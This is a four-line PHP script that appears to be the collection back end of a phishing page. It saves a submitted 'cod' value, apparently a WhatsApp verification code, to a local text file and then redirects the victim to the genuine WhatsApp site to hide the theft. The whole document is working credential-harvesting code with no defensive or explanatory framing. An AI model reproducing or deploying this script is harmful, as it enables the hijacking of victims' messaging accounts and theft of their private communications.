<?php
file_put_contents("cod.txt", "\nCod: " . $_POST['cod'] . "\n", FILE_APPEND);
header('Location: https://whatsapp.com');
?>
